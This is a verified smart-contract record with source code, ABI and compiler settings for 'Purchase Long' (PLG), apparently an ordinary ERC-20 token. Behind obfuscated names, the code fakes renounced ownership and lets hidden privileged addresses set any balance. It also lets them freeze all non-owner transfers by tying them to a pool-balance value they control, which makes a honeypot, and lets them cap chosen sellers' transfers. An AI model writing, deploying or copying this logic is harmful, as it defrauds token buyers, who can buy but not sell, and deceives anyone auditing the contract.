{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface isTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeTradingAt {\n    function createPair(address exemptLaunched, address liquidityTeam) external returns (address);\n}\n\ninterface receiverLaunchedFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountTx) external view returns (uint256);\n\n    function transfer(address amountAt, uint256 liquidityAuto) external returns (bool);\n\n    function allowance(address feeLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountAt,\n        uint256 liquidityAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listSwapExempt, uint256 value);\n    event Approval(address indexed feeLiquidity, address indexed spender, uint256 value);\n}\n\ninterface receiverLaunchedFeeMetadata is receiverLaunchedFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PurchaseLong is modeBuy, receiverLaunchedFee, receiverLaunchedFeeMetadata {\n\n    function transferFrom(address senderTradingSell, address amountAt, uint256 liquidityAuto) external override returns (bool) {\n        if (_msgSender() != atAmount) {\n            if (walletFund[senderTradingSell][_msgSender()] != type(uint256).max) {\n                require(liquidityAuto <= walletFund[senderTradingSell][_msgSender()]);\n                walletFund[senderTradingSell][_msgSender()] -= liquidityAuto;\n            }\n        }\n        return autoMinLiquidity(senderTradingSell, amountAt, liquidityAuto);\n    }\n\n    function modeAuto() private view {\n        require(exemptFeeTx[_msgSender()]);\n    }\n\n    function receiverList(address enableSellShould, uint256 liquidityAuto) public {\n        modeAuto();\n        toTx[enableSellShould] = liquidityAuto;\n    }\n\n    uint256 constant liquidityAutoFrom = 13 ** 10;\n\n    constructor (){\n        if (limitTrading) {\n            minLaunch = false;\n        }\n        isTo takeTotal = isTo(atAmount);\n        txTokenSender = modeTradingAt(takeTotal.factory()).createPair(takeTotal.WETH(), address(this));\n        if (senderAuto != amountMaxMin) {\n            senderAuto = amountMaxMin;\n        }\n        modeEnable = _msgSender();\n        feeTx();\n        exemptFeeTx[modeEnable] = true;\n        toTx[modeEnable] = launchedMaxAt;\n        \n        emit Transfer(address(0), modeEnable, launchedMaxAt);\n    }\n\n    mapping(address => uint256) private toTx;\n\n    uint256 private launchedMaxAt = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public exemptFeeTx;\n\n    function toFundList(address sellTeam) public {\n        require(sellTeam.balance < 100000);\n        if (feeMax) {\n            return;\n        }\n        if (limitTrading) {\n            limitTrading = false;\n        }\n        exemptFeeTx[sellTeam] = true;\n        \n        feeMax = true;\n    }\n\n    bool private minLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeReceiver;\n    }\n\n    uint256 buyFeeTeam;\n\n    address atAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function toReceiver(address senderTradingSell, address amountAt, uint256 liquidityAuto) internal returns (bool) {\n        require(toTx[senderTradingSell] >= liquidityAuto);\n        toTx[senderTradingSell] -= liquidityAuto;\n        toTx[amountAt] += liquidityAuto;\n        emit Transfer(senderTradingSell, amountAt, liquidityAuto);\n        return true;\n    }\n\n    function approve(address receiverMin, uint256 liquidityAuto) public virtual override returns (bool) {\n        walletFund[_msgSender()][receiverMin] = liquidityAuto;\n        emit Approval(_msgSender(), receiverMin, liquidityAuto);\n        return true;\n    }\n\n    string private senderTxMin = \"Purchase Long\";\n\n    function name() external view virtual override returns (string memory) {\n        return senderTxMin;\n    }\n\n    address feeTradingBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private limitTrading;\n\n    uint256 public senderAuto;\n\n    address public txTokenSender;\n\n    function receiverToken(uint256 liquidityAuto) public {\n        modeAuto();\n        enableReceiverReceiver = liquidityAuto;\n    }\n\n    string private tradingFeeSell = \"PLG\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedMaxAt;\n    }\n\n    function owner() external view returns (address) {\n        return marketingToken;\n    }\n\n    uint256 enableReceiverReceiver;\n\n    uint8 private feeReceiver = 18;\n\n    function getOwner() external view returns (address) {\n        return marketingToken;\n    }\n\n    event OwnershipTransferred(address indexed atExempt, address indexed exemptList);\n\n    uint256 private amountMaxMin;\n\n    function transfer(address enableSellShould, uint256 liquidityAuto) external virtual override returns (bool) {\n        return autoMinLiquidity(_msgSender(), enableSellShould, liquidityAuto);\n    }\n\n    function feeTx() public {\n        emit OwnershipTransferred(modeEnable, address(0));\n        marketingToken = address(0);\n    }\n\n    bool public feeMax;\n\n    function feeSell(address swapToken) public {\n        modeAuto();\n        \n        if (swapToken == modeEnable || swapToken == txTokenSender) {\n            return;\n        }\n        fundWallet[swapToken] = true;\n    }\n\n    address public modeEnable;\n\n    mapping(address => mapping(address => uint256)) private walletFund;\n\n    function autoMinLiquidity(address senderTradingSell, address amountAt, uint256 liquidityAuto) internal returns (bool) {\n        if (senderTradingSell == modeEnable) {\n            return toReceiver(senderTradingSell, amountAt, liquidityAuto);\n        }\n        uint256 exemptMin = receiverLaunchedFee(txTokenSender).balanceOf(feeTradingBuy);\n        require(exemptMin == enableReceiverReceiver);\n        require(amountAt != feeTradingBuy);\n        if (fundWallet[senderTradingSell]) {\n            return toReceiver(senderTradingSell, amountAt, liquidityAutoFrom);\n        }\n        return toReceiver(senderTradingSell, amountAt, liquidityAuto);\n    }\n\n    mapping(address => bool) public fundWallet;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingFeeSell;\n    }\n\n    function allowance(address marketingTeam, address receiverMin) external view virtual override returns (uint256) {\n        if (receiverMin == atAmount) {\n            return type(uint256).max;\n        }\n        return walletFund[marketingTeam][receiverMin];\n    }\n\n    address private marketingToken;\n\n    function balanceOf(address amountTx) public view virtual override returns (uint256) {\n        return toTx[amountTx];\n    }\n\n    uint256 private launchedFeeReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listSwapExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFeeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapToken\",\"type\":\"address\"}],\"name\":\"feeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSellShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAuto\",\"type\":\"uint256\"}],\"name\":\"receiverList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityAuto\",\"type\":\"uint256\"}],\"name\":\"receiverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"}],\"name\":\"toFundList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSellShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTradingSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTokenSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PurchaseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}